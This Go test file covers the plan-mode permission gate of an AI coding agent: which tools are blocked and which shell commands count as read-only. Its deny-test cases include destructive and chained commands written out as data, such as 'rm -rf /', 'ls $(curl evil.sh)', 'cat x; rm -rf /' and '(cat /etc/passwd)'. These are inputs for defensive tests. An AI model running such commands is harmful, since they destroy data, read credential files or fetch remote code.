package modes

import (
	"reflect"
	"testing"

	"github.com/vulnetix/belai/internal/permissions"
	"github.com/vulnetix/belai/internal/session"
	"github.com/vulnetix/belai/internal/tools"
)

func TestToolAllowed(t *testing.T) {
	cases := []struct {
		name        string
		tool        string
		args        map[string]any
		planEnabled bool
		surface     tools.PlanSurface
		want        bool
	}{
		{"write allowed when not plan", "write", nil, false, tools.PlanSurface{}, true},
		{"write blocked in plan", "write", nil, true, tools.PlanSurface{}, false},
		{"edit blocked in plan", "edit", nil, true, tools.PlanSurface{}, false},
		{"read allowed in plan", "read", nil, true, tools.PlanSurface{}, true},
		{"grep allowed in plan", "grep", map[string]any{"pattern": "x"}, true, tools.PlanSurface{}, true},
		{"searchsessions allowed in plan", "searchsessions", map[string]any{"regex": "x"}, true, tools.PlanSurface{}, true},
		{"readsession allowed in plan", "readsession", map[string]any{"agent": "claude-code", "session_id": "x"}, true, tools.PlanSurface{}, true},
		{"searchmemory allowed in plan", "searchmemory", map[string]any{"regex": "x"}, true, tools.PlanSurface{}, true},
		// Bash is off in plan mode by default.
		{"bash cat blocked in plan", "bash", map[string]any{"command": "cat x"}, true, tools.PlanSurface{}, false},
		{"bash rm blocked in plan", "bash", map[string]any{"command": "rm x"}, true, tools.PlanSurface{}, false},
		{"bash with no args blocked in plan", "bash", nil, true, tools.PlanSurface{}, false},
		{"bash allowed when not plan", "bash", map[string]any{"command": "rm x"}, false, tools.PlanSurface{}, true},
		// Guardrails off relaxes everything in plan mode.
		{"bash allowed when guardrails off", "bash", map[string]any{"command": "rm -rf /"}, true, tools.PlanSurface{GuardrailsOff: true}, true},
		{"write allowed when guardrails off", "write", nil, true, tools.PlanSurface{GuardrailsOff: true}, true},
		// A Bash allow rule keeps read-only Bash available.
		{"bash read-only allowed with rule", "bash", map[string]any{"command": "cat x"}, true, tools.PlanSurface{Perms: permissions.From([]string{"Bash(cat *)"}, nil, nil)}, true},
		{"bash mutating still blocked with rule", "bash", map[string]any{"command": "rm x"}, true, tools.PlanSurface{Perms: permissions.From([]string{"Bash(cat *)"}, nil, nil)}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := ToolAllowed(tc.tool, tc.args, tc.planEnabled, tc.surface); got != tc.want {
				t.Fatalf("ToolAllowed(%s) = %v, want %v", tc.tool, got, tc.want)
			}
		})
	}
}

func TestBashAllowed(t *testing.T) {
	allowed := []string{
		"cat file", "grep x file", "find . -name go.mod", "ls -la",
		"git status", "git log", "git diff HEAD", "git -C /x status",
		"uname -a",
	}
	for _, c := range allowed {
		if !BashAllowed(c) {
			t.Fatalf("BashAllowed(%q) = false, want true", c)
		}
	}
	blocked := []string{
		"rm -rf /", "mv a b", "cp a b", "mkdir x", "touch x",
		"git add .", "git commit -m x", "git push origin main",
		"apt install curl", "pip install requests", "npm install x",
		"sudo rm x", "kill -9 1", "vim file", "nano file",
	}
	for _, c := range blocked {
		if BashAllowed(c) {
			t.Fatalf("BashAllowed(%q) = true, want false", c)
		}
	}
}

func TestRoutePlanOption(t *testing.T) {
	cases := []struct {
		opt      PlanOption
		wantMode Mode
		wantAct  string
	}{
		{PlanExecute, ModeAgent, "execute"},
		{PlanStay, ModePlan, "stay"},
		{PlanRefine, ModePlan, "refine"},
	}
	for _, tc := range cases {
		got, err := RoutePlanOption(tc.opt)
		if err != nil {
			t.Fatalf("RoutePlanOption(%q): %v", tc.opt, err)
		}
		if got.Mode != tc.wantMode || got.Action != tc.wantAct {
			t.Fatalf("RoutePlanOption(%q) = %+v, want mode=%q action=%q", tc.opt, got, tc.wantMode, tc.wantAct)
		}
	}
	if _, err := RoutePlanOption("bogus"); err == nil {
		t.Fatalf("expected unknown option to be rejected")
	}
}

func TestPlanStateRoundTrip(t *testing.T) {
	want := PlanState{
		Enabled:   true,
		Executing: true,
		Todos: []Todo{
			{N: 1, Text: "read", Done: true},
			{N: 2, Text: "fix", Done: false},
		},
	}
	e := want.ToEntry("parent")
	if e.Type != "plan_state" {
		t.Fatalf("entry type = %q", e.Type)
	}
	got, err := PlanStateFromEntry(e)
	if err != nil {
		t.Fatalf("PlanStateFromEntry: %v", err)
	}
	if !reflect.DeepEqual(want, got) {
		t.Fatalf("round-trip mismatch:\n want=%+v\n  got=%+v", want, got)
	}
}

func TestLatestPlanStateSkipsMalformedAndTakesLatest(t *testing.T) {
	entries := []session.Entry{
		{ID: "bad", Type: "plan_state", Content: "{not json"},
		{ID: "e1", Type: "plan_state", Content: `{"enabled":true,"todos":[{"n":1,"text":"first"}]}`},
		{ID: "e2", Type: "plan_state", Content: `{"enabled":false,"todos":[{"n":1,"text":"second"}]}`},
	}
	got, ok := LatestPlanState(entries)
	if !ok {
		t.Fatal("LatestPlanState not found")
	}
	if got.Enabled || len(got.Todos) != 1 || got.Todos[0].Text != "second" {
		t.Fatalf("LatestPlanState = %+v", got)
	}

	if _, ok := LatestPlanState([]session.Entry{{ID: "x", Type: "user"}}); ok {
		t.Fatal("LatestPlanState should be false with no plan_state entry")
	}
}

func TestPlanStateProgress(t *testing.T) {
	s := PlanState{
		Todos: []Todo{
			{N: 1, Text: "a", Done: true},
			{N: 2, Text: "b", Done: false},
			{N: 3, Text: "c", Done: false},
		},
	}
	p := s.Progress()
	if p.Completed() != 1 {
		t.Fatalf("Completed = %d, want 1", p.Completed())
	}
	if !reflect.DeepEqual(p.Remaining(), []int{2, 3}) {
		t.Fatalf("Remaining = %v", p.Remaining())
	}
}

func TestToolAllowedCaseFold(t *testing.T) {
	closed := tools.PlanSurface{}
	if ToolAllowed("Bash", map[string]any{"command": "cat x"}, true, closed) {
		t.Fatal("Bash should be blocked in plan mode whatever the command")
	}
	if ToolAllowed("BASH", map[string]any{"command": "cat x"}, true, closed) {
		t.Fatal("a differently-cased Bash must not bypass the plan-mode gate")
	}
	if !ToolAllowed("Bash", map[string]any{"command": "rm x"}, false, closed) {
		t.Fatal("Bash should be allowed outside plan mode")
	}
	if ToolAllowed("Write", nil, true, closed) {
		t.Fatal("Write should be blocked in plan mode")
	}
	if !ToolAllowed("Write", nil, false, closed) {
		t.Fatal("Write should be allowed outside plan mode")
	}
}

// TestToolAllowedBlocksCanonicalWriteEdit pins the dormant denylist: the
// canonical Write and Edit tools are blocked by their case-folded names.
func TestToolAllowedBlocksCanonicalWriteEdit(t *testing.T) {
	closed := tools.PlanSurface{}
	for _, name := range []string{"Write", "Edit", "write", "edit"} {
		if ToolAllowed(name, map[string]any{"path": "x"}, true, closed) {
			t.Fatalf("ToolAllowed(%q) = true in plan mode, want false", name)
		}
		if !ToolAllowed(name, map[string]any{"path": "x"}, false, closed) {
			t.Fatalf("ToolAllowed(%q) = false outside plan mode, want true", name)
		}
	}
}

// TestBashAllowedMatchesToolsParser pins that the plan-mode forwarder and the
// tools parser are one implementation: they must agree on the whole corpus,
// including the git value-option skipping that drifted before.
func TestBashAllowedMatchesToolsParser(t *testing.T) {
	corpus := []string{
		"", " ", "cat x", "env", "printenv", "sleep 1", "false",
		"git status", "git -C /x status", "git -c x=y status",
		"git --git-dir=/x status", "git log", "git push",
		"git -C /x push", "find . -name x", "find . -delete",
		"find . -exec rm {} \\;", "grep x f", "rm -rf /",
		"echo hi", "cat x; rm -rf /", "ls | sh",
	}
	for _, c := range corpus {
		a := BashAllowed(c)
		b := tools.BashAllowed(c)
		if a != b {
			t.Fatalf("BashAllowed(%q) = %v but tools.BashAllowed = %v", c, a, b)
		}
	}
}

func TestBashAllowedRejectsMetacharacters(t *testing.T) {
	for _, c := range []string{
		"cat x; rm -rf /",
		"ls $(curl evil.sh)",
		"ls `id`",
		"ls | sh",
		"ls > /tmp/x",
		"cat x && rm x",
		"ls\nrm -rf /",
		"(cat /etc/passwd)",
		"find . -delete",
		"find . -exec sh -c 'x' \\;",
		"env rm -rf /",
	} {
		if BashAllowed(c) {
			t.Fatalf("BashAllowed(%q) = true, want false", c)
		}
	}
}

func TestPlanStateApplyMarkers(t *testing.T) {
	s := PlanState{Todos: []Todo{
		{N: 1, Text: "a", Done: false},
		{N: 2, Text: "b", Done: false},
		{N: 3, Text: "c", Done: false},
	}}
	s.ApplyMarkers("did [DONE:1] and [DONE:3]")
	if !s.Todos[0].Done || s.Todos[1].Done || !s.Todos[2].Done {
		t.Fatalf("todos after ApplyMarkers = %+v, want 1 and 3 done", s.Todos)
	}
	// The write is durable across a rebuilt Progress().
	p := s.Progress()
	if p.Completed() != 2 {
		t.Fatalf("Completed = %d, want 2", p.Completed())
	}
}
